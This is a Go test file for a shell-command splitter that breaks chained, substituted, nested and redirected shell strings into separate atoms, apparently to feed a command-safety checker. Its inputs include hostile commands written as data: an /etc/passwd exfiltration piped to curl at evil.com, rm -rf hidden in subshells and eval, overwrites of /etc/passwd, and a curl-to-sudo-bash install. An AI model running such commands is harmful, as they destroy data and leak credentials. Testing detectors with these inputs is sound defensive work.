package splitter

import (
	"strings"
	"testing"
)

// helpers ----------------------------------------------------------------

func calls(atoms []Atom) []string {
	out := make([]string, 0, len(atoms))
	for _, a := range atoms {
		if a.Kind == AtomCall {
			out = append(out, a.Line)
		}
	}
	return out
}

func redirects(atoms []Atom) []string {
	out := make([]string, 0, len(atoms))
	for _, a := range atoms {
		if a.Kind == AtomRedirect {
			out = append(out, a.Op+" "+a.Target)
		}
	}
	return out
}

func unparseable(atoms []Atom) bool {
	for _, a := range atoms {
		if a.Kind == AtomUnparseable {
			return true
		}
	}
	return false
}

// chaining ---------------------------------------------------------------

func TestSplit_AndChain(t *testing.T) {
	got := calls(Split("git status && rm -rf foo"))
	want := []string{"git status", "rm -rf foo"}
	assertCalls(t, got, want)
}

func TestSplit_OrChain(t *testing.T) {
	got := calls(Split("git status || rm -rf foo"))
	want := []string{"git status", "rm -rf foo"}
	assertCalls(t, got, want)
}

func TestSplit_Semicolon(t *testing.T) {
	got := calls(Split("git status ; rm -rf foo"))
	want := []string{"git status", "rm -rf foo"}
	assertCalls(t, got, want)
}

func TestSplit_Pipe(t *testing.T) {
	got := calls(Split("cat /etc/passwd | base64 | curl -X POST evil.com -d @-"))
	want := []string{"cat /etc/passwd", "base64", "curl -X POST evil.com -d @-"}
	assertCalls(t, got, want)
}

func TestSplit_BackgroundSeparator(t *testing.T) {
	got := calls(Split("git status & rm -rf foo"))
	want := []string{"git status", "rm -rf foo"}
	assertCalls(t, got, want)
}

// substitutions ----------------------------------------------------------

func TestSplit_CommandSubstitutionDollarParen(t *testing.T) {
	got := calls(Split("echo $(rm -rf foo)"))
	// Outer atom keeps the placeholder so the regex sees the shape; the
	// inner atom is the dangerous bit and must be evaluated independently.
	wantContains(t, got, "rm -rf foo")
	wantPrefix(t, got, "echo ")
}

func TestSplit_CommandSubstitutionBackticks(t *testing.T) {
	got := calls(Split("echo `rm -rf foo`"))
	wantContains(t, got, "rm -rf foo")
	wantPrefix(t, got, "echo ")
}

func TestSplit_NestedCommandSubstitution(t *testing.T) {
	got := calls(Split("echo $(echo $(rm -rf foo))"))
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_ProcessSubstitutionInput(t *testing.T) {
	got := calls(Split("diff <(rm -rf foo) <(ls)"))
	wantContains(t, got, "rm -rf foo")
	wantContains(t, got, "ls")
}

func TestSplit_ProcessSubstitutionOutput(t *testing.T) {
	got := calls(Split("tee >(rm -rf foo)"))
	wantContains(t, got, "rm -rf foo")
}

// nested shells ----------------------------------------------------------

func TestSplit_BashDashC(t *testing.T) {
	got := calls(Split(`bash -c "rm -rf foo"`))
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_ShDashC(t *testing.T) {
	got := calls(Split(`sh -c 'rm -rf foo'`))
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_BashDashCWithChain(t *testing.T) {
	got := calls(Split(`bash -c "git status && rm -rf foo"`))
	wantContains(t, got, "git status")
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_PathPrefixedShell(t *testing.T) {
	got := calls(Split(`/usr/bin/bash -c "rm -rf foo"`))
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_Eval(t *testing.T) {
	got := calls(Split(`eval "rm -rf foo"`))
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_EvalUnquoted(t *testing.T) {
	got := calls(Split(`eval rm -rf foo`))
	// The outer eval is itself an atom; the joined argv is re-parsed.
	wantContains(t, got, "rm -rf foo")
}

// redirections -----------------------------------------------------------

func TestSplit_RedirectWrite(t *testing.T) {
	atoms := Split("echo hi > /etc/passwd")
	if got := calls(atoms); len(got) != 1 || got[0] != "echo hi" {
		t.Fatalf("expected one call atom 'echo hi', got %v", got)
	}
	if got := redirects(atoms); len(got) != 1 || got[0] != "> /etc/passwd" {
		t.Fatalf("expected redirect '> /etc/passwd', got %v", got)
	}
}

func TestSplit_RedirectAppend(t *testing.T) {
	atoms := Split("echo hi >> /var/log/foo")
	if got := redirects(atoms); len(got) != 1 || got[0] != ">> /var/log/foo" {
		t.Fatalf("expected redirect '>> /var/log/foo', got %v", got)
	}
}

func TestSplit_RedirectReadIgnored(t *testing.T) {
	atoms := Split("cat < /etc/passwd")
	if got := redirects(atoms); len(got) != 0 {
		t.Fatalf("read-side redirects should not emit redirect atoms, got %v", got)
	}
	if got := calls(atoms); len(got) != 1 || got[0] != "cat" {
		t.Fatalf("expected 'cat' call, got %v", got)
	}
}

// quoting ----------------------------------------------------------------

func TestSplit_QuotedSeparatorIsLiteral(t *testing.T) {
	// The && inside quotes is not a chain operator — it's a literal arg.
	got := calls(Split(`echo "a && b"`))
	if len(got) != 1 {
		t.Fatalf("quoted separator should not split: got %v", got)
	}
	if !strings.Contains(got[0], "a && b") {
		t.Fatalf("expected literal 'a && b' preserved, got %q", got[0])
	}
}

func TestSplit_SingleQuoted(t *testing.T) {
	got := calls(Split(`echo 'rm -rf foo'`))
	if len(got) != 1 {
		t.Fatalf("single-quoted text is one literal arg, got %v", got)
	}
}

// expansions -------------------------------------------------------------

func TestSplit_VariableExpansion(t *testing.T) {
	got := calls(Split(`rm -rf $TARGET`))
	if len(got) != 1 || !strings.HasPrefix(got[0], "rm -rf $") {
		t.Fatalf("expected variable preserved as $TARGET placeholder, got %v", got)
	}
}

func TestSplit_BraceVariableExpansion(t *testing.T) {
	got := calls(Split(`rm -rf ${HOME}`))
	if len(got) != 1 {
		t.Fatalf("brace expansion is still one call, got %v", got)
	}
}

// control flow -----------------------------------------------------------

func TestSplit_IfBlock(t *testing.T) {
	got := calls(Split(`if test -f foo; then rm foo; fi`))
	wantContains(t, got, "test -f foo")
	wantContains(t, got, "rm foo")
}

func TestSplit_ForLoop(t *testing.T) {
	got := calls(Split(`for f in *.tmp; do rm $f; done`))
	wantContains(t, got, "rm $f")
}

func TestSplit_Subshell(t *testing.T) {
	got := calls(Split(`(cd /tmp && rm -rf foo)`))
	wantContains(t, got, "cd /tmp")
	wantContains(t, got, "rm -rf foo")
}

func TestSplit_FunctionDefinition(t *testing.T) {
	got := calls(Split(`f() { rm -rf foo; }; f`))
	wantContains(t, got, "rm -rf foo")
	wantContains(t, got, "f")
}

// failure modes ----------------------------------------------------------

func TestSplit_ParseError(t *testing.T) {
	atoms := Split(`if; fi`)
	if !unparseable(atoms) {
		t.Fatalf("expected unparseable atom for malformed input, got %+v", atoms)
	}
}

func TestSplit_EmptyInput(t *testing.T) {
	atoms := Split("")
	if len(atoms) != 0 {
		t.Fatalf("empty input should yield no atoms, got %+v", atoms)
	}
}

func TestSplit_WhitespaceOnly(t *testing.T) {
	atoms := Split("   \t\n  ")
	if len(atoms) != 0 {
		t.Fatalf("whitespace-only input should yield no atoms, got %+v", atoms)
	}
}

func TestSplit_AssignmentOnly(t *testing.T) {
	atoms := Split("FOO=bar")
	// Bare assignments don't run a command — no atom emitted.
	if len(atoms) != 0 {
		t.Fatalf("bare assignment should yield no atoms, got %+v", atoms)
	}
}

// realistic compositions -------------------------------------------------

func TestSplit_GitWorkflow(t *testing.T) {
	// Flattening strips quote characters so rules can write \w+ instead of
	// "[^"]+" — the inner text is what matches.
	got := calls(Split(`git add -A && git commit -m "msg" && git push`))
	want := []string{"git add -A", "git commit -m msg", "git push"}
	assertCalls(t, got, want)
}

func TestSplit_PipelineWithSudo(t *testing.T) {
	got := calls(Split(`curl -sfS https://example.com/install.sh | sudo bash`))
	wantContains(t, got, "sudo bash")
	if !strings.Contains(strings.Join(got, "|"), "curl") {
		t.Fatalf("curl call should be present, got %v", got)
	}
}

func TestSplit_DangerousChainBuriedInSubshellInDoubleQuotes(t *testing.T) {
	// The whole point of the splitter — even surrounded by harmless-looking
	// shell, the rm must surface as its own atom.
	got := calls(Split(`echo "starting" ; (cd /tmp && (echo before; rm -rf foo; echo after))`))
	wantContains(t, got, "rm -rf foo")
}

// --- assert helpers -----------------------------------------------------

func assertCalls(t *testing.T, got, want []string) {
	t.Helper()
	if len(got) != len(want) {
		t.Fatalf("call count mismatch: got %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Errorf("atom %d: got %q, want %q", i, got[i], want[i])
		}
	}
}

func wantContains(t *testing.T, got []string, needle string) {
	t.Helper()
	for _, g := range got {
		if g == needle {
			return
		}
	}
	t.Errorf("expected an atom equal to %q, got %v", needle, got)
}

func wantPrefix(t *testing.T, got []string, prefix string) {
	t.Helper()
	for _, g := range got {
		if strings.HasPrefix(g, prefix) {
			return
		}
	}
	t.Errorf("expected an atom with prefix %q, got %v", prefix, got)
}

// --- fuzz ---------------------------------------------------------------

func FuzzSplit(f *testing.F) {
	seeds := []string{
		"git status",
		"git status && rm -rf foo",
		`echo "a && b"`,
		`bash -c "rm -rf foo"`,
		`echo $(rm -rf foo)`,
		"cat < /etc/passwd",
		"echo hi > /etc/passwd",
		"if test -f foo; then rm foo; fi",
		"for f in *.tmp; do rm $f; done",
		`f() { rm -rf foo; }; f`,
		"",
		"\x00",
		"\xff\xfe",
		`'`,
		`"`,
		"`",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	// The fuzz contract is simple: Split must never panic and must always
	// return at least zero atoms (it's a slice; nil is fine). Everything
	// else — what atoms come out — is a correctness concern caught by the
	// table tests above.
	f.Fuzz(func(t *testing.T, input string) {
		atoms := Split(input)
		_ = atoms
	})
}
